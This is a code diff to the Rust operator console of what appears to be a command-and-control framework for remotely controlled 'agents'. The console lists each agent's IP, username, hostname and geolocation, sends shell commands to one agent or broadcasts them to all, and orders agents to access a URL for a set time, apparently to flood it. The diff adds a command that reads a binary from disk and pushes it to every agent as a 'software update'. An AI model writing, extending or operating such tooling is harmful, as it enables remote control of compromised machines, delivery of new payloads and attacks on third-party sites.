@@ -2,6 +2,7 @@ use crate::handlers::models::{Agent, C2Message};
 use futures::{SinkExt, StreamExt};
 use reqwest::Client;
 use serde_json::{Value, json};
+use std::fs;
 use std::process::Command;
 use std::sync::Arc;
 use std::time::Duration;
@@ -197,6 +198,15 @@ impl Operator {
                                 println!("Usage: command <uuid> <cmd>");
                             }
                         }
+                        "agent-software-update" => {
+                            if parts.len() == 3 {
+                                let version = parts[1].to_string();
+                                let file_path = parts[2].to_string();
+                                self.agent_software_update(&version, &file_path).await?;
+                            } else {
+                                println!("Usage: agent-software-update <version> <file_path>");
+                            }
+                        }
                         "clear" => {
                             if cfg!(target_os = "windows") {
                                 Command::new("cls").status().expect("Error running command.");
@@ -218,6 +228,7 @@ impl Operator {
                             println!("  access <url> <secs>   - Order agents to access a URL for <secs> seconds");
                             println!("  broadcast <cmd>       - Send a command to all agents");
                             println!("  command <uuid> <cmd>  - Send a command to a specific agent");
+                            println!("  agent-software-update <version> <file_path> - Update agent software with binary from file");
                             println!("  clear                 - Clear the terminal");
                             println!("  exit                  - Quit the shell");
                             println!("  help                  - Show this help");
@@ -235,27 +246,15 @@ impl Operator {
                             let agents: Vec<Agent> = serde_json::from_value(value)
                                 .map_err(|e| format!("Deserialization error: {}", e))?;
                             for agent in &agents {
-                                println!(
-                                    "Agent UUID: {}\nIP: {}\nUsername: {}\nHostname: {}\nOnline: {}\nCountry: {}\nCity: {}\nRegion: {}\nLatitude: {}\nLongitude: {}\n",
-                                    agent.uuid,
-                                    agent.ip,
-                                    agent.username,
-                                    agent.hostname,
-                                    agent.online,
-                                    agent.country,
-                                    agent.city,
-                                    agent.region,
-                                    agent.latitude,
-                                    agent.longitude,
-                                );
+                                println!("{}", agent);
                             }
-                            println!("[+] {total} registered agents ({online} online).");
+                            println!("\n[+] {total} registered agents ({online} online).");
                         }
-                        "response" => {
-                            if let Some(output) = value.get("output").and_then(|v| v.as_str()) {
-                                println!("Agent output: {}", output);
-                            }
-                        }
+                        // "response" => {
+                        //     if let Some(output) = value.get("output").and_then(|v| v.as_str()) {
+                        //         println!("Agent output: {}", output);
+                        //     }
+                        // }
                         "details" => {
                             if let Ok(agent) = serde_json::from_value::<Option<Agent>>(value) {
                                 if let Some(agent) = agent {
@@ -313,6 +312,21 @@ impl Operator {
         })?;
         self.ws_sender.send(Message::text(command_msg)).await?;
         println!("Sent command to agent {}: {}", uuid, cmd);
+        Ok(())
+    }
+
+    async fn agent_software_update(
+        &self,
+        version: &str,
+        file_path: &str,
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        let binary = fs::read(file_path)?;
+        let msg = serde_json::to_string(&C2Message::AgentSoftwareUpdateWithBinary {
+            version: version.to_string(),
+            binary,
+        })?;
+        self.ws_sender.send(Message::text(msg)).await?;
+        println!("Sent agent software update command: version={}", version);
         Ok(())
     }
 }
